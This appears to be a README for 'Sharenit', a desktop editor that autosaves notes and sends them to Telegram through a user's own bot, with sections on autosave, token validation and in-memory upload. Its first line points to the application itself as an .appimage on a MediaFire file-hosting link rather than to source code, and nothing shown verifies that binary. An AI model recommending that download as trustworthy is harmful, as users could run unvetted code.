again github irritation - here is main link of application: https://www.mediafire.com/file/ehmybjhhpr7sn68/sharenit.appimage/file
---

# Sharenit

A lightweight desktop broadcasting tool that allows real-time note/code sharing directly to Telegram using a configured bot — with local autosave and in-memory transmission.

---

## Problem Case

In teaching, live coding, or collaborative sessions:

* Switching between editor and Telegram breaks flow.
* Manual copy-paste is inefficient.
* File exporting before sending is unnecessary overhead.
* Web tools introduce distraction and dependency.

The real problem is:

> There is no minimal, local-first, editor-to-Telegram bridge that works instantly without browser dependency.

---

## Why It Exists

Sharenit exists to eliminate workflow friction between:

* Writing content
* Saving content
* Broadcasting content

It is designed to:

* Keep everything local
* Avoid cloud intermediaries
* Avoid file-export dependency
* Reduce context switching

---

## Core Idea

Create a minimal desktop editor that:

1. Automatically saves local file changes.
2. Stores Telegram credentials locally.
3. Validates token authenticity before saving.
4. Sends editor content directly from RAM to Telegram.
5. Requires no browser or web dashboard.

---

## Solution

Sharenit integrates:

* CustomTkinter-based UI
* Telegram Bot API
* Local JSON configuration storage
* Real-time autosave (event-based)
* Direct in-memory document upload

Instead of:

Write → Save → Export → Open Telegram → Attach → Send

It becomes:

Write → Click Share

---

## Technical Approach

### 1. Auto Save Mechanism

* Editor binds to `<KeyRelease>`
* On edit event:

  * Current content is written directly to disk (if file is open)
* No timer loop
* No delayed batch writing
* Immediate disk sync per key release

This ensures file consistency without background scheduling.

---

### 2. Token + Chat ID Self Integration

* On startup:

  * Config file is checked.
  * If exists → Token & Chat ID auto-loaded.
  * If missing → Footer warning shown.

* On settings save:

  * Token is validated via Telegram `/getMe`.
  * If valid → stored in local JSON.
  * If invalid → rejected.
  * Overwrites allowed.

No source code modification required.

---

### 3. RAM-Based File Transmission

When sharing:

* Editor content is fetched.
* Converted into `BytesIO` object.
* Named dynamically as file.
* Sent directly to Telegram via `sendDocument`.

No temporary file is created.
No disk dependency during sharing.

Pure in-memory transmission.

---

### 4. CPU & Resource Behavior

* No background threads.
* No polling loops.
* No idle CPU usage.
* Network calls are blocking (main-thread).
* Minimal RAM usage (editor content + small JSON config).

The app remains lightweight and deterministic.

---

### 5. Error Handling

Handles:

* Invalid token (401 Unauthorized)
* Invalid chat ID (400 Bad Request)
* No internet connection
* Missing configuration
* Corrupted config file

All feedback is shown via footer.

---

## Features

* Live content editing
* Event-driven autosave
* Local file editing support
* Direct Telegram sharing
* In-memory document upload
* Persistent local configuration
* Token validation before saving
* Runtime credential updates
* UI state switching (Main ↔ Settings)
* No browser dependency
* No cloud storage requirement

---

## Conclusion

Sharenit is not a text editor.

It is a controlled content broadcaster.

It bridges:

Local editing → Telegram distribution

With:

* Minimal UI
* Minimal CPU footprint
* Direct API integration
* No unnecessary abstraction layers

---

## Summary

Sharenit is a desktop utility that:

* Edits content locally
* Automatically saves changes
* Validates and stores Telegram credentials
* Sends content directly from RAM to Telegram
* Operates without web dependency

It demonstrates:

* UI architecture
* Event-driven state handling
* API validation workflow
* Configuration persistence
* Local-first system design

---
